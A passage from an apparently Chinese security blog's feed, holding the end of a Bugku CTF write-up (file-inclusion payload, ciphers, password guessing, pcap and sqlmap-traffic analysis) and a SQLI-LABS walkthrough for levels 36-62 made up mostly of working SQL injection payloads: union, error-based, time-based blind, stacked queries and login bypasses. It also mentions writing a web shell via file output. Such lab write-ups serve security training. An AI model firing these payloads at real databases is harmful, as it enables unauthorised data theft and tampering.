<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//120.24.86.145:9010?a=http://vps_ip/index.html&amp;b=&lt;a&gt;Hello World&lt;/a&gt;%0a&amp;e=http://vps_ip/a.txt</span></span><br></pre></td></tr></table></figure>
<p>说一下坑点，在使用vim编辑文件的时候，他会默认在文件末尾添加一个换行符，这也是为什么b参数后面要添加一个 <code>%0a(换行符)</code> ，但是在e参数对应的代码中的 <code>I&#39;m Administrator!</code> 可是没有换行符的，怎么办呢？百度找到了一个方法：</p>
<blockquote>
<p>1、进入vim前，增加-b参数<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -<span class="selector-tag">b</span> <span class="selector-tag">a</span>.txt</span><br></pre></td></tr></table></figure></p>
<p>2、进入命令行模式，开启 set noeol<br>这样就不会在文件末尾添加换行符了。</p>
</blockquote>
<p>c参数和d参数个人感觉思路是c参数包含一个PHP文件，然后d参数反序列化读取，题目还有一个flag.php文件，所以c参数应该就是要包含该文件，题目过滤了flag，可以用大写绕过 <code>Flag.php</code> ，但是这里应该有一个类来反序列化才对，我感觉应该是通过文件泄露来获取，但是尝试了好多次都不行，直接访问flag，会下载到一个文件，信息为</p>
<blockquote>
<p>please call admin to get flag</p>
</blockquote>
<p>不知道这是什么意思，题目到这儿就卡住了，所以payload只有</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//120.24.86.145:9010/?a=http://vps_ip/index.html&amp;b=&lt;a&gt;Hello%20World&lt;/a&gt;%0a&amp;e=http://vps_ip/a.txt&amp;c=Flag.php</span></span><br></pre></td></tr></table></figure>
<h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><h2 id="滴答-滴"><a href="#滴答-滴" class="headerlink" title="滴答 ~ 滴"></a>滴答 ~ 滴</h2><p>摩斯解密可得<code>bkctfmisc</code>，提交即可,注意全部大写。</p>
<h2 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h2><p>栅栏解密</p>
<h2 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h2><p>这段密文是一种ook语言，直接在线跑一下即可</p>
<h2 id="这不是摩斯密码"><a href="#这不是摩斯密码" class="headerlink" title="这不是摩斯密码"></a>这不是摩斯密码</h2><p>brainfuck代码，在上一题那个网站跑一下即可。</p>
<h2 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h2><blockquote>
<p>lf5{ag024c483549d7fd@@1}<br>一张纸条上凌乱的写着2 1 6 5 3 4</p>
</blockquote>
<p>刚开始看到{前面有三位以为明文应该是key，顺着这个思路往下想，结果不对，后面注意到密文的2，1两位翻转一下是fl，6，5两位加上就是flag，于是再把3,4位放到原来5,6位的位置，那么前六位就是 <code>flag{5</code> ，我们可以看到前六位进行的调整分别是1，2位交换位置，5,6位交换到3,4位顺序不变，3,4位调整到5,6位但是位置交换一下，于是把每六位分成一组，每组按照前述的方法做变换，最终可以得到flag</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;52048c453d794df1&#125;</span><span class="xml">@@</span></span><br></pre></td></tr></table></figure>
<h2 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h2><p>base91解码</p>
<h1 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h1><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><p>根据生日姓名等猜测<code>zs19970315</code></p>
<h2 id="王晓明的日记"><a href="#王晓明的日记" class="headerlink" title="王晓明的日记"></a>王晓明的日记</h2><p>利用bugku在线密码生成工具生成密码字典测试一下即可</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="flag被盗"><a href="#flag被盗" class="headerlink" title="flag被盗"></a>flag被盗</h2><p>过滤条件 <code>http contains &quot;flag&quot;</code>，在第二条数据中即发现了flag</p>
<h2 id="抓到一只苍蝇"><a href="#抓到一只苍蝇" class="headerlink" title="抓到一只苍蝇"></a>抓到一只苍蝇</h2><p>首先查看一下http请求，在第一个就发现</p>
<p><img src="bugkuwriteup/1.png" alt=""></p>
<p>本能的感觉这题和这个fly.rar应该有点关系，所以过滤一下 ‘http contains “fly.rar”‘</p>
<p><img src="bugkuwriteup/2.png" alt=""></p>
<p>看到了题目的提示内容，感觉走对了，这个包应该是QQ邮箱的包，所以肯定是走post请求的，过滤一下获取rar文件包 <code>http.request.method == POST</code></p>
<p>可以看到从第二个到第六个正式rar的文件内容，但是这五个文件的总长度却比fly.rar要大，应该有多余的头部，计算一下头部长度</p>
<blockquote>
<p>(527521bytes – 525701bytes) / 5 =  364 bytes</p>
</blockquote>
<p>把每个一次导出，然后用hxd去掉头部364字节，之后再合并一下</p>
<p><img src="bugkuwriteup/3.png" alt=""></p>
<p>可以看到md5值是正确的，证明我们得到了正确的fly.rar文件，但是解压时却要求输入密码，猜测是伪加密，将文件头0x1674后面的84改为80。（84为加密，80/20不加密），解密之后有个TXT文件，binwalk，foremost一下，在图片中找到一个二维码，扫码即可得到flag。</p>
<h2 id="信息提取"><a href="#信息提取" class="headerlink" title="信息提取"></a>信息提取</h2><p>给的数据包是sqlmap注入的一个数据包，题目的意思是让我们从sqlmap的payload中恢复出数据，数据包的最后部分就是数据的记录，吧这部分分出来保存为a.pcap，将关键信息存入txt文件中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import scapy</span></span><br><span class="line"><span class="comment"># from scapy.all import *</span></span><br><span class="line"><span class="comment"># from scapy.utils import PcapReader</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pcaps = rdpcap("a.pcap")</span></span><br><span class="line"><span class="comment"># file = open('1.txt','wb')</span></span><br><span class="line"><span class="comment"># for i in range(476):</span></span><br><span class="line"><span class="comment"># 	file.write(pcaps[i]['Raw'].load)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将流量包字段信息导出，之后在用sublime过滤只留下请求内容和response长度，示例如下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E1 HTTP/1.1</span></span><br><span class="line"><span class="comment"># Content-Length: 166</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_rigth</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> int(x) &gt; <span class="number">4</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	ans = <span class="string">""</span></span><br><span class="line">	req = file.readlines()</span><br><span class="line">	length = req[<span class="number">238</span>:<span class="number">476</span>]</span><br><span class="line">	req = req[<span class="number">0</span>:<span class="number">238</span>]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(req)//<span class="number">7</span> - <span class="number">1</span>):</span><br><span class="line">		num = int(re.search(<span class="string">'&gt;([0-9]&#123;2,&#125;)'</span>,unquote(req[i*<span class="number">7</span>+<span class="number">6</span>],<span class="string">'utf-8'</span>)).group(<span class="number">1</span>))</span><br><span class="line">		<span class="keyword">if</span> is_rigth(length[i*<span class="number">7</span>+<span class="number">6</span>][<span class="number">-3</span>]):</span><br><span class="line">			ans += chr(int(num+<span class="number">1</span>))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			ans += chr(int(num))</span><br><span class="line">	print(ans)</span><br><span class="line"><span class="comment"># ISG&#123;BLind_SQl_InJEcTi0N_DeTEcTEd&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLI-LABS(Less36-Less65)]]></title>
      <url>/2018/03/05/sqli-labs3/</url>
      <content type="html"><![CDATA[<p>接上篇</p>
<a id="more"></a>
<h1 id="LESS-36"><a href="#LESS-36" class="headerlink" title="LESS-36"></a>LESS-36</h1><p>函数<font face="futura">mysql_real_escape_string()</font>转义SQL语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
<blockquote><p>\\x00<br>\\n<br>\\r<br>\\</p>
<p><font face="futura">‘</font></p>
<p><font face="“futura"">"</font><br>\\x1a</p>
</blockquote>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p>
<p>可以使用宽字节注入</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>%df' union select <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
<p>在使用<font face="futura">mysql_real_escape_string()</font>函数时，想要避免这种问题，需要将mysql设置为<font face="futura">gbk</font>即可</p>
<h1 id="LESS-37"><a href="#LESS-37" class="headerlink" title="LESS-37"></a>LESS-37</h1><p>和34关绕过一样，waf和36关差不多</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin♦' or 1=1 limit 3,1#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="堆叠注入stacked-injection"><a href="#堆叠注入stacked-injection" class="headerlink" title="堆叠注入stacked injection"></a><font face="futura">堆叠注入stacked injection</font></h1><p>所谓堆叠注入，就是指多条SQL语句同时执行，在命令行中每个SQL语句都是以<font face="futura">;</font>结尾。虽然说union语句也可以执行两条select语句，区别在于union语句可以执行的语句有限，而堆叠注入可以执行任何语句。比如<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pruducts <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">delete</span> <span class="keyword">from</span> products</span><br></pre></td></tr></table></figure></p>
<p>堆叠注入的局限性在于并非每个环境都可以执行，受到环境的限制，</p>
<hr>
<h1 id="LESS-38"><a href="#LESS-38" class="headerlink" title="LESS-38"></a>LESS-38</h1><p>本题明注盲注皆可以，明注payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p><strong>堆叠注入</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1';<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到数据库里面成功创建，然后再删除一下<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1';<span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">test</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-39"><a href="#LESS-39" class="headerlink" title="LESS-39"></a>LESS-39</h1><p>payload<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3--+</span></span><br></pre></td></tr></table></figure></p>
<p>也可堆叠注入</p>
<h1 id="LESS-40"><a href="#LESS-40" class="headerlink" title="LESS-40"></a>LESS-40</h1><p>盲注payload<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">2</span>') and ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>--+</span><br></pre></td></tr></table></figure></p>
<p>本题错误不回显，不能报错注入</p>
<h1 id="LESS-41"><a href="#LESS-41" class="headerlink" title="LESS-41"></a>LESS-41</h1><p>和40关一样无法报错，可以和39关一样<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1;<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>多条命令执行。也可以注入<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,<span class="title">database</span>()--+</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-42"><a href="#LESS-42" class="headerlink" title="LESS-42"></a>LESS-42</h1><p>本关mysqli_real_escape_string只过滤了username字段，对于password则没有过滤，payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=c';<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span>#</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-43"><a href="#LESS-43" class="headerlink" title="LESS-43"></a>LESS-43</h1><p>和42关一样，只是闭合方式不同<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_user</span>=admin&amp;login_password=c') <span class="keyword">or</span> <span class="attribute">1</span>=1#</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-44"><a href="#LESS-44" class="headerlink" title="LESS-44"></a>LESS-44</h1><p>和42关一样，只是没有报错无法盲注<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_user</span>=admin&amp;login_password=c' <span class="keyword">or</span> <span class="attribute">1</span>=1#</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-45"><a href="#LESS-45" class="headerlink" title="LESS-45"></a>LESS-45</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_user</span>=admin&amp;login_password=c') <span class="keyword">or</span> <span class="attribute">1</span>=1#</span><br></pre></td></tr></table></figure>
<p>注意：这几关页面都在login.php页面，不在原页面。</p>
<h1 id="LESS-46"><a href="#LESS-46" class="headerlink" title="LESS-46"></a>LESS-46</h1><p>本关是<font face="futura">order by</font>注入，<br>尝试一下分号发现有报错，报错注入可以用一下<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">sort</span>=<span class="number">2</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0x3c</span>,(<span class="built_in">select</span> database())))</span><br></pre></td></tr></table></figure></p>
<p>看不到数据库名的话查看一下元素即可</p>
<p>对于这种问题有三种方法</p>
<blockquote>
<p>1、直接添加注入语句 <font face="futura">?sort=(select ******)</font><br>2、利用一些函数，例如rand函数，<code>?sort=rand(sql语句)</code>，而且此处rand(true)和rand(false)是不相同的。<br>3、利用and，例如<code>?sort=1 and (加sql语句)</code></p>
</blockquote>
<p>还可以执行infile等命令上传一句话木马</p>
<h1 id="LESS-47"><a href="#LESS-47" class="headerlink" title="LESS-47"></a>LESS-47</h1><p>本关只是闭合方式发生了变化，只能进行报错和延时注入</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">sort</span>=1' <span class="keyword">and</span> extractvalue(1,concat(0x3c,(select database())))%23</span><br><span class="line">?<span class="attribute">sort</span>=1 <span class="keyword">and</span> <span class="keyword">if</span>(<span class="attribute">1</span>=1, sleep(1), <span class="literal">null</span>)</span><br><span class="line">?<span class="attribute">sort</span>=1' <span class="keyword">and</span> (length(database())) = 8 <span class="keyword">and</span> <span class="keyword">if</span>(<span class="attribute">1</span>=1, sleep(1), <span class="literal">null</span>)%23</span><br><span class="line">?<span class="attribute">sort</span>=1' <span class="keyword">and</span> (ascii(substr((select database()) ,1,1))) = 115 <span class="keyword">and</span> <span class="keyword">if</span>(<span class="attribute">1</span>=1, sleep(1), <span class="literal">null</span>)%23</span><br></pre></td></tr></table></figure>
<h1 id="LESS-48"><a href="#LESS-48" class="headerlink" title="LESS-48"></a>LESS-48</h1><p>这关没有报错回显，延时盲注即可<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">sort</span>=1 <span class="keyword">and</span> (length(database())) = 8 <span class="keyword">and</span> <span class="keyword">if</span>(<span class="attribute">1</span>=1, sleep(1), <span class="literal">null</span>)%23</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-49"><a href="#LESS-49" class="headerlink" title="LESS-49"></a>LESS-49</h1><p>跟上关差不多只是闭合方式不同<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">sort</span>=1' <span class="keyword">and</span> (length(database())) = 8 <span class="keyword">and</span> <span class="keyword">if</span>(<span class="attribute">1</span>=1, sleep(1), <span class="literal">null</span>)%23</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-50"><a href="#LESS-50" class="headerlink" title="LESS-50"></a>LESS-50</h1><p>考察order by的堆叠注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-51"><a href="#LESS-51" class="headerlink" title="LESS-51"></a>LESS-51</h1><p>闭合方式不同<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1';<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-52"><a href="#LESS-52" class="headerlink" title="LESS-52"></a>LESS-52</h1><p>本题不报错，无法报错注入，依然可以堆叠注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-53"><a href="#LESS-53" class="headerlink" title="LESS-53"></a>LESS-53</h1><p>本关错误不能回显，但是可以和51关一样堆叠注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1';<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-54"><a href="#LESS-54" class="headerlink" title="LESS-54"></a>LESS-54</h1><p>从本关开始进行更加进阶的注入，所用数据库也改为<strong><font face="futura">challenges</font></strong>，每个答案只能尝试10次，10次之后则会重置表名选项等信息。</p>
<p>由于已经知道数据库名，所以可以直接开始爆表名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>得到表名 <code>utj0xhedjp</code>(你的和我的不一样，是随机的)，接下来爆列名<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1' union select 1,group_concat(column_name),3 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'utj0xhedjp'</span>--+</span><br></pre></td></tr></table></figure></p>
<p>得到<code>id,sessid,secret_W2TD,tryy</code>，得到字段<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">-1</span>' union select <span class="number">1</span>,secret_W2TD,<span class="number">3</span> <span class="keyword">from</span> utj0xhedjp<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>得到<code>vYPh8AlkQMTlEGkZXRKWo1PT</code>，提交即可。</p>
<h1 id="LESS-55"><a href="#LESS-55" class="headerlink" title="LESS-55"></a>LESS-55</h1><p>本关限制次数为14次，主要是前面尝试闭合，这个找出来后面就简单了<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>爆表名<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>) <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>jq0p5t7r1m</p>
</blockquote>
<p>爆列名<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1) union select 1,group_concat(column_name),3 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'jq0p5t7r1m'</span>%23</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>id,sessid,secret_3JXI,tryy</p>
</blockquote>
<p>继续<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>) <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">secret_3JXI</span>,3 <span class="title">from</span> <span class="title">jq0p5t7r1m</span>%23</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-56"><a href="#LESS-56" class="headerlink" title="LESS-56"></a>LESS-56</h1><p>payload<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>')%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>剩下的就不做了。</p>
<p><strong>注意：</strong>本题中，如果用<code>?id=1”%23</code>也可以闭合，只是无法继续后面的步骤，提交上述参数后执行的SQL语句为<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> security.users <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">'1"#'</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>在数据库中执行确实能够查到数据，那么问题在哪呢？</p>
<blockquote>
<p>查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如<font face="futura">‘1”#’</font>转化为数字值为1，如果是<font face="futura">‘11fads’</font>则为11，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。 </p>
</blockquote>
<h1 id="LESS-57"><a href="#LESS-57" class="headerlink" title="LESS-57"></a>LESS-57</h1><p>本题是双引号闭合<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1"%23</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-58"><a href="#LESS-58" class="headerlink" title="LESS-58"></a>LESS-58</h1><p>本题无法进行联合注入，但是可以报错，故报错注入<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">extractvalue</span>(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> )))<span class="symbol">%23</span></span><br></pre></td></tr></table></figure></p>
<p>爆内容<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">extractvalue</span>(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> secret_AJHH from y<span class="number">9</span>hrn<span class="keyword">i0</span>ywl)))<span class="symbol">%23</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-59"><a href="#LESS-59" class="headerlink" title="LESS-59"></a>LESS-59</h1><p>本题可以直接报错注入<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">extractvalue</span>(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> database())))<span class="symbol">%23</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-60"><a href="#LESS-60" class="headerlink" title="LESS-60"></a>LESS-60</h1><p>改变闭合方式<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1") <span class="keyword">and</span> extractvalue(1,concat(0x5c,(select database())))%23</span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-61"><a href="#LESS-61" class="headerlink" title="LESS-61"></a>LESS-61</h1><p>双引号闭合，有点奇葩<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>')) <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x5c,(<span class="keyword">select</span> database())))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<h1 id="LESS-62"><a href="#LESS-62" class="headerlink" title="LESS-62"></a>LESS-62</h1><p>本题没有错误回显，无法union注入，而且注释符貌似也被过滤了，可以考虑盲注<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">10</span> <span class="keyword">and</span> <span class="string">'a'</span>=<span class="symbol">'a</span></span><br></pre></td></tr></table></figure></p>
<p>爆表名<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="built_in">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">54</span> <span class="built_in">and</span> 'a'='a</span><br></pre></td></tr></table></figure></p>
<p>爆列名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'64r31rkgr6'</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">100</span> <span class="keyword">and</span> <span class="string">'a'</span>=<span class="string">'a</span></span><br></pre></td></tr></table></figure></p>
